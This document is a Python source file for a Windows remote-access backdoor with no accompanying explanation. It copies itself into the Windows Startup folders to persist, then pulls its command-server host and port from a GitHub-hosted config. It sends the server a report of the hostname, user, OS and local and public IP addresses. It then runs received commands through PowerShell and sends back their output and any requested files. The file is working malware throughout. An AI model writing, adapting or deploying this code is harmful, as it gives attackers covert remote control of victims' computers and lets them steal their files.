import os
import sys
import time
import socket
import subprocess
import platform
import shutil
import requests
import re

CONFIG_URL = "https://raw.githubusercontent.com/shad0w2000/shad0w-conn/main/main.json"
RETRY_INTERVAL = 10
SOCKET_TIMEOUT = 15
BUFFER_SIZE = 4096

class DeviceManager:
    
    @staticmethod
    def ensure_persistence():
        current_path = os.path.realpath(sys.executable)
        file_name = os.path.basename(current_path)
        
        target_dirs = [
            os.path.join(os.getenv('APPDATA', ''), r"Microsoft\Windows\Start Menu\Programs\Startup"),
            os.path.join(os.getenv('PROGRAMDATA', ''), r"Microsoft\Windows\Start Menu\Programs\Startup")
        ]

        for folder in filter(os.path.exists, target_dirs):
            try:
                dest = DeviceManager._generate_unique_path(folder, file_name)
                if os.path.dirname(current_path).lower() != folder.lower():
                    shutil.copy2(current_path, dest)
                    print(f"[+] Persistence established: {dest}")
                    if os.getcwd().lower() in ["c:\\", "c:/"]:
                        sys.exit()
                        print("[*] Starting client...")
            except Exception as e:
                print(f"[-] Failed to copy to {folder}: {e}")

    @staticmethod
    def _generate_unique_path(folder, file_name):
        base, ext = os.path.splitext(file_name)
        counter = 1
        path = os.path.join(folder, file_name)
        while os.path.exists(path):
            path = os.path.join(folder, f"{base}_{counter}{ext}")
            counter += 1
        return path

    @staticmethod
    def get_system_report():
        try:
            public_ip = requests.get('https://api.ipify.org', timeout=5).text
        except Exception:
            public_ip = "N/A"

        info = {
            "Hostname": socket.gethostname(),
            "User": os.getlogin(),
            "OS": f"{platform.system()} {platform.release()}",
            "Arch": platform.machine(),
            "local IP": socket.gethostbyname(socket.gethostname()),
            "Public IP": public_ip,
            "Directory": os.getcwd()
        }
        return "\n".join([f"{k}: {v}" for k, v in info.items()])


class NetworkClient:

    def __init__(self):
        self.socket = None

    def fetch_remote_config(self):
        try:
            res = requests.get(CONFIG_URL, timeout=10)
            res.raise_for_status()
            host = re.search(r"HOST\s*=\s*['\"]([^'\"]+)['\"]", res.text)
            port = re.search(r"PORT\s*=\s*(\d+)", res.text)
            # host = "10.220.170.150"
            # port = 8080

            print(f"[+] Config fetched: Host={host.group(1) if host else 'N/A'}, Port={port.group(1) if port else 'N/A'}")
            if host and port:
                return host.group(1), int(port.group(1))
        except Exception as e:
            print(f"[-] Config fetch error: {e}")
        return None, None
    
    # def fetch_remote_config(self):
    #     try:
    #         host_value = "10.220.170.150"
    #         port_value = 8080
            
    #         print(f"[+] Config used: Host={host_value}, Port={port_value}")
            
    #         return host_value, port_value
            
    #     except Exception as e:
    #         print(f"[-] Config error: {e}")
    #     return None, None

    def send_data(self, data):
        if isinstance(data, str):
            data = data.encode('utf-8')
        header = str(len(data)).zfill(16).encode()
        self.socket.sendall(header + data)

    def receive_data(self):
        try:
            header = self.socket.recv(16).decode().strip()
            if not header: return None
            
            total_size = int(header)
            received_data = b""
            while len(received_data) < total_size:
                chunk = self.socket.recv(min(total_size - len(received_data), BUFFER_SIZE))
                if not chunk: break
                received_data += chunk
            return received_data.decode('utf-8', errors='ignore')
        except Exception:
            return None

    def execute_command(self, cmd):
        if cmd.startswith('cd '):
            return self._change_directory(cmd[3:].strip())
        
        if cmd.startswith('download '):
            return self._read_file(cmd[9:].strip())

        try:
            process = subprocess.Popen(
                ["powershell.exe", "-NoProfile", "-Command", cmd],
                stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True
            )
            stdout, stderr = process.communicate()
            return (stdout + stderr).decode('utf-8').strip() or "Success (No Output)."
        except Exception as e:
            return f"Execution Error: {e}"

    def _change_directory(self, path):
        try:
            os.chdir(path)
            return f"Changed to: {os.getcwd()}"
        except Exception as e:
            return f"CD Error: {e}"

    def _read_file(self, path):
        if os.path.isfile(path):
            with open(path, 'rb') as f:
                return f.read()
        return "File not found."

    def start(self):
        while True:
            
            host, port = self.fetch_remote_config()
            if not host:
                time.sleep(RETRY_INTERVAL)
                continue

            try:
                with socket.create_connection((host, port), timeout=SOCKET_TIMEOUT) as self.socket:
                    self.socket.settimeout(None)
                    self.send_data(DeviceManager.get_system_report())

                    while True:
                        command = self.receive_data()
                        if not command or command.lower() == 'exit':
                            break
                        
                        response = self.execute_command(command)
                        self.send_data(response)
            except Exception as e:
                print(f"[-] Connection lost: {e}. Retrying...")
                time.sleep(RETRY_INTERVAL)


if __name__ == "__main__":

    DeviceManager.ensure_persistence()
    client = NetworkClient()
    client.start()